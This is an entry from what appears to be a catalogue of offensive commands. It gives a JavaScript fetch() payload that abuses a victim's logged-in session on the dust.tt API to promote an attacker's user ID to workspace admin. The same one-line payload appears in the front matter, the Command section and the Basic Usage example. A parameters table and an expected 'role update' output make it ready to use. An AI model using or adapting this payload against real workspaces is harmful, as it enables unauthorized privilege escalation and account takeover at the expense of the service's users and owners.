---
data: >-
  fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`,{method:'POST',headers:{'content-type':'application/json','accept':'*/*','x-commit-hash':'41c0391'},credentials:'include',body:JSON.stringify({role:"admin"})})
tags:
  - fetch
  - post
  - escalation
type: command
output: Promotes user to admin
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:38.384Z'
id: a9b9ab1c-f486-41e8-a39f-d2178d50f9a2
verified: false
validated: true
submitted: true
---
# promote-to-admin-js

## Command

```javascript
fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`,{method:'POST',headers:{'content-type':'application/json','accept':'*/*','x-commit-hash':'41c0391'},credentials:'include',body:JSON.stringify({role:"admin"})})
```

## Description

Sends POST request to promote the attacker user to admin role using victim's authenticated session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| method | POST | Yes |
| headers | Content-type, accept, commit hash | Yes |
| credentials | 'include' | Yes |
| body | JSON {role: "admin"} | Yes |

## Examples

### Basic Usage

```javascript
fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`,{method:'POST',headers:{'content-type':'application/json','accept':'*/*','x-commit-hash':'41c0391'},credentials:'include',body:JSON.stringify({role:"admin"})})
```

## Expected Output

Successful response indicating role update.

## Related

- [[commands/fetch-user-data-js]]
